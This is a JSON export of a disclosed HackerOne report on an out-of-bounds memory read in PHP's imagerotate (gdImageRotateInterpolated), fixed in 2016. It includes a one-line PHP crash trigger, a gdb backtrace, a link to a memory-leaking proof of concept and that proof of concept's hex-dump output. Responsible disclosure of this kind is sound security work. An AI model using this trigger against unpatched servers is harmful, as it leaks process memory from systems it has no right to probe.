{
  "id": 110720,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA3MjA=",
  "url": "https://hackerone.com/reports/110720",
  "title": "Arbitary Memory Read via gdImageRotateInterpolated Array Index Out of Bounds",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-01-14T17:19:24.870Z",
  "submitted_at": "2016-01-14T17:19:24.870Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "libnex",
    "url": "/libnex",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/468/f5a6e39ea76748aa48e36e0087eb8b09ff892d6c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ7UPNDVG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133243Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2FdYg8YfwvWiXy6svYJjKl%2FURKGGduuyVIXyYnoiQaLAIgR3w8yXR6ttmnDSwkbH9cCkxMI%2BSZ1jcS%2FlplDEs%2Bd2cqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDJ6foeQbMNarjQZudSqPBeub2YNA0aLW68Fxu%2Fiqcgj%2FRpzrTyA4g9%2Bf7fVuhMb3XNCzZKtpMQyTtmxYZMTQnpndXDGRRTsmbGUpgNSBTRViz6CRI4BGWJKlWbxstCkbpJFvDPajIUwdnwVlYlNKtWouyaYOEce6x%2BLDj5O8Wc9RS8idg9NHzFwyUldTT4ptrBVMqj%2FMtnklXxiD85fvqqpEcWrSvjo9nd8kE3KN4GT%2BgSugnwKs%2BSKgQUEJhUkTJ3UH4dfU5JFabHtUdC78b3wWnoV%2BtToSrnI%2FnTlzVZJR2Sz2MNJ%2BeVJW9K1ODYTOOU0EJUwpjT4vQbWZxSczV9jVgDwYaiLFYwOky%2BLMPsJhWEamVFLWGfk9UVPvr3PZBg5vChguJ8iZVzvvPlYGyWYHo%2Fl%2B4WrH6YnaDf0QuphrRelXpi4ADYtnozrquyNAklExELHY6uvmMIhhtTtsCEESYAmTfps%2B6ulWcQKGfxYOXIIfjK2Em0LzLN5WGYOYhm1KsODCRBYf9id7gqX4nMgfm2pvwKK2HoeP1eFsOfdNPINvhlcwguOyhAIKhwp2NLd6TjF2VpNjbyWk56hcRedvCpQ%2BaaEYLjU%2FVVAHZuEVWDMhj89OtAn9BsLbgJ2tcu%2FpEKB%2FPG6jumWZ4my7O%2Baqh57JM2MxoS3XCd%2FMAp8hfeQ0aoD3NKssb2ma4CtJXL%2F5dr5siaje5bqzR89o5E2adB5HPphy2deyXbD3illcrUvzS29TQLZrYHubh7%2BZzEYCQriP3h9Nsl9NOtMglLIMAGu%2FzAgbLsdOKIO3%2BJRDxBxgXOBjUc4dexLHc6efO2YHVFf3tU6mJmXxcEWPaMn4AHxQuPud6NGSno97Fo0U8qWhAD%2FSfHRQ7CHFUG4wid2%2FxgY6sQF1SxCB1MKmO8w658nr1QXWUnFS59VR6HRM%2FvtudGCwB%2FUN%2BH7jgWVrclpqrHJLjLmbfAHeOAwUQVBQEaO8icCnoIzhSOv8JLbKZ32PEcTWutetuRRcnPGz6Ggqq%2BhIRRnqR3AW0OZR9v26H6DMI6yk%2BxOP%2FTiayARYd1UAqfeaiGnUGpb7BAUaeqGW8fXW%2BjRzpTvKAnBwAwPiJHt9wnRduyw5FQkItU9IPxIyGxaqEt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7d9e07a8f363c23d425b02765188cf599031bedaf77895269c4274e5450f8e8a",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ7UPNDVG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133243Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2FdYg8YfwvWiXy6svYJjKl%2FURKGGduuyVIXyYnoiQaLAIgR3w8yXR6ttmnDSwkbH9cCkxMI%2BSZ1jcS%2FlplDEs%2Bd2cqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDJ6foeQbMNarjQZudSqPBeub2YNA0aLW68Fxu%2Fiqcgj%2FRpzrTyA4g9%2Bf7fVuhMb3XNCzZKtpMQyTtmxYZMTQnpndXDGRRTsmbGUpgNSBTRViz6CRI4BGWJKlWbxstCkbpJFvDPajIUwdnwVlYlNKtWouyaYOEce6x%2BLDj5O8Wc9RS8idg9NHzFwyUldTT4ptrBVMqj%2FMtnklXxiD85fvqqpEcWrSvjo9nd8kE3KN4GT%2BgSugnwKs%2BSKgQUEJhUkTJ3UH4dfU5JFabHtUdC78b3wWnoV%2BtToSrnI%2FnTlzVZJR2Sz2MNJ%2BeVJW9K1ODYTOOU0EJUwpjT4vQbWZxSczV9jVgDwYaiLFYwOky%2BLMPsJhWEamVFLWGfk9UVPvr3PZBg5vChguJ8iZVzvvPlYGyWYHo%2Fl%2B4WrH6YnaDf0QuphrRelXpi4ADYtnozrquyNAklExELHY6uvmMIhhtTtsCEESYAmTfps%2B6ulWcQKGfxYOXIIfjK2Em0LzLN5WGYOYhm1KsODCRBYf9id7gqX4nMgfm2pvwKK2HoeP1eFsOfdNPINvhlcwguOyhAIKhwp2NLd6TjF2VpNjbyWk56hcRedvCpQ%2BaaEYLjU%2FVVAHZuEVWDMhj89OtAn9BsLbgJ2tcu%2FpEKB%2FPG6jumWZ4my7O%2Baqh57JM2MxoS3XCd%2FMAp8hfeQ0aoD3NKssb2ma4CtJXL%2F5dr5siaje5bqzR89o5E2adB5HPphy2deyXbD3illcrUvzS29TQLZrYHubh7%2BZzEYCQriP3h9Nsl9NOtMglLIMAGu%2FzAgbLsdOKIO3%2BJRDxBxgXOBjUc4dexLHc6efO2YHVFf3tU6mJmXxcEWPaMn4AHxQuPud6NGSno97Fo0U8qWhAD%2FSfHRQ7CHFUG4wid2%2FxgY6sQF1SxCB1MKmO8w658nr1QXWUnFS59VR6HRM%2FvtudGCwB%2FUN%2BH7jgWVrclpqrHJLjLmbfAHeOAwUQVBQEaO8icCnoIzhSOv8JLbKZ32PEcTWutetuRRcnPGz6Ggqq%2BhIRRnqR3AW0OZR9v26H6DMI6yk%2BxOP%2FTiayARYd1UAqfeaiGnUGpb7BAUaeqGW8fXW%2BjRzpTvKAnBwAwPiJHt9wnRduyw5FQkItU9IPxIyGxaqEt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aad6d7f797fa2a828b80d63524d4d39dcf85f65770335b754af5b39c8c309683"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:38:12.885Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:38:05.947Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "1)Bug report at: https://bugs.php.net/bug.php?id=70976&edit=2\n2) Patch submitted: https://www.dropbox.com/s/rr5xti66cpt17mn/gd_interpolation.patch?dl=0\n3) Issue has been fixed in PHP 5.5.31, 5.6.17, 7.0.2\n\n\n---Vuln Description--\nThis is the function prototype for ImageRotate:\n\nresource imagerotate ( resource $image , float $angle , int $bgd_color [, int $ignore_transparent = 0 ] )\n\n\n$bgd_color specifies the background color of an image have it has been rotated. This is passed in as an integer that represents an index to the color palette.\n\nThere is a lack of validation of $bgd_color. One can pass in a large number that exceeds the color palette array. This reads memory beyond the color palette. Information of the memory leak can then be obtained via the background color after the image has been rotated.\n\nTest script:\n---------------\n./configure --with-gd\n\n\n1) Pass in a large $bgd_color:\n\nphp -r \"imagerotate(imagecreate(1,1),45,0x7ffffff9);\"\n\n\n2) This causes it to crash at gd_interpolation.c:2174  :\n\n\nStopped reason: SIGSEGV\n0x00000000005fb0b4 in gdImageRotateInterpolated (src=0x7ffff7fb5b38, angle=45, bgcolor=0x7ffffff9) at php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174\n2174                            bgcolor =  gdTrueColorAlpha(src->red[bgcolor], src->green[bgcolor], src->blue[bgcolor], src->alpha[bgcolor]);\n\n\n\ngdb-peda$ bt\n#0  0x00000000005fb0b4 in gdImageRotateInterpolated (src=0x7ffff7fb5b38, angle=45, bgcolor=0x7ffffff9) at /home/elaw/php-5.6.15/ext/gd/libgd/gd_interpolation.c:2174\n#1  0x00000000005d0b73 in zif_imagerotate (ht=0x3, return_value=0x7ffff7fb5810, return_value_ptr=0x7ffff7f80090, this_ptr=0x0, return_value_used=0x0)\n at /home/elaw/php-5.6.15/ext/gd/gd.c:2111\n#2  0x0000000000850915 in zend_do_fcall_common_helper_SPEC (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:558\n#3  0x000000000085856c in ZEND_DO_FCALL_SPEC_CONST_HANDLER (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:2602\n#4  0x000000000084ee1a in execute_ex (execute_data=0x7ffff7f800c8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:363\n#5  0x000000000084f806 in zend_execute (op_array=0x7ffff7fb42f8) at /home/elaw/php-5.6.15/Zend/zend_vm_execute.h:388\n#6  0x00000000007f6636 in zend_eval_stringl (str=0x106ff80 \"imagerotate(imagecreate(1,1),45,2147483641);\", str_len=0x2c, retval_ptr=0x0,\n string_name=0xd46ac4 \"Command line code\") at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1077\n#7  0x00000000007f68bc in zend_eval_stringl_ex (str=0x106ff80 \"imagerotate(imagecreate(1,1),45,2147483641);\", str_len=0x2c, retval_ptr=0x0,\n string_name=0xd46ac4 \"Command line code\", handle_exceptions=0x1) at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1124\n#8  0x00000000007f6940 in zend_eval_string_ex (str=0x106ff80 \"imagerotate(imagecreate(1,1),45,2147483641);\", retval_ptr=0x0, string_name=0xd46ac4 \"Command line code\",\n handle_exceptions=0x1) at /home/elaw/php-5.6.15/Zend/zend_execute_API.c:1135\n#9  0x000000000092ce99 in do_cli (argc=0x3, argv=0x106ff00) at /home/elaw/php-5.6.15/sapi/cli/php_cli.c:1034\n#10 0x000000000092ddc5 in main (argc=0x3, argv=0x106ff00) at /home/elaw/php-5.6.15/sapi/cli/php_cli.c:1378\n#11 0x00007ffff6027b45 in __libc_start_main (main=0x92d722 <main>, argc=0x3, argv=0x7fffffffe338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,\n stack_end=0x7fffffffe328) at libc-start.c:287\n#12 0x0000000000421409 in _start ()\n\n\n3) One can see that the color platte only has 256 entries:\n\ngdb-peda$ ptype src\ntype = struct gdImageStruct {\n......\n    int red[256];\n    int green[256];\n    int blue[256];\n....\n\n\n4) Thus we are encountering an array index out of bounds.\n\n\n\n5) I've created a full exploit that reads large contiguous chunk of memory. The POC can be obtained from https://www.dropbox.com/s/bwuivbug62ki4cs/gdImageRotateInterpolated_Array_Index_OOB_MEM_Read.php?dl=0\n\n\n./php gdImageRotateInterpolated_Array_Index_OOB_MEM_Read.php\n\n\n0c40  01 00 00 00 01 00 00 00  01 00 00 00 01 00 00 00   ........ ........\n0c50  01 00 00 00 01 00 00 00  01 00 00 00 01 00 00 9d   ........ .......�\n0c60  01 00 00 9d 01 00 00 fd  01 00 00 00 01 00 00 00   ...�...� ........\n0c70  01 00 00 ef 01 00 00 00  01 00 00 2f 01 00 00 00   ...�.... .../....\n0c80  01 00 00 20 01 00 00 ff  01 00 00 c8 01 00 00 ff   ... ...� ...�...�\n0c90  01 00 00 20 01 00 00 ff  01 00 00 c8 01 00 00 ff   ... ...� ...�...�\n0ca0  01 00 00 70 01 00 00 ff  01 00 00 60 01 00 00 ff   ...p...� ...`...�\n0cb0  01 00 00 08 01 00 00 ff  01 00 00 b0 01 00 00 ff   .......� ...�...�\n0cc0  01 00 00 58 01 00 00 ff  01 00 00 88 01 00 00 ff   ...X...� ...�...�\n0cd0  01 00 00 30 01 00 00 ff  01 00 00 d8 01 00 00 ff   ...0...� ...�...�\n0ce0  01 00 00 80 01 00 00 ff  01 00 00 28 01 00 00 ff   ...�...� ...(...�\n0cf0  01 00 00 d0 01 00 00 ff  01 00 00 58 01 00 00 ff   ...�...� ...X...�\n0d00  01 00 00 00 01 00 00 ff  01 00 00 a8 01 00 00 ff   .......� ...�...�\n0d10  01 00 00 50 01 00 00 ff  01 00 00 f8 01 00 00 ff   ...P...� ...�...�\n0d20  01 00 00 a0 01 00 00 ff  01 00 00 d8 01 00 00 ff   ...�...� ...�...�\n0d30  01 00 00 80 01 00 00 ff  01 00 00 28 01 00 00 ff   ...�...� ...(...�\n0d40  01 00 00 d0 01 00 00 ff  01 00 00 78 01 00 00 ff   ...�...� ...x...�\n0d50  01 00 00 20 01 00 00 ff  01 00 00 f0 01 00 00 ff   ... ...� ...�...�\n0d60  01 00 00 98 01 00 00 ff  01 00 00 40 01 00 00 ff   ...�...� ...@...�\n.....\n",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:38:06.015Z",
  "allow_singular_disclosure_after": -184910077.35552448,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "dyabla",
    "contriver20"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
